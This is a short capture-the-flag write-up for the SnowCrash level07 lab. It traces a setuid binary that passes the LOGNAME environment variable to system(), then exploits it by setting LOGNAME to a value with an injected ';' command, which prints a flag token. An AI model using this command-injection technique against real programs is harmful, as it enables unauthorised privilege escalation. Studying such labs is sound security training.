-> Make a `ltrace` to see what functions are called

```bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                             = 2007
geteuid()                                                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
getenv("LOGNAME")                                                                     = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280)                   = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                = 0
+++ exited (status 0) +++
```

We see that environment variables are used with `getenv`

and that echo is called `/bin/echo level07` that why we have echo when we launch the executable.

-> If we ls -l we see that the uid flag is set.

### Strategy

-> Change the value of the LOGNAME environment variable.
`level07@SnowCrash:~$ export LOGNAME='coucou; getflag'`

The semicolon separe two shell functions so after execute echo it will execute getflag.

```
level07@SnowCrash:~$ ./level07
coucou
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
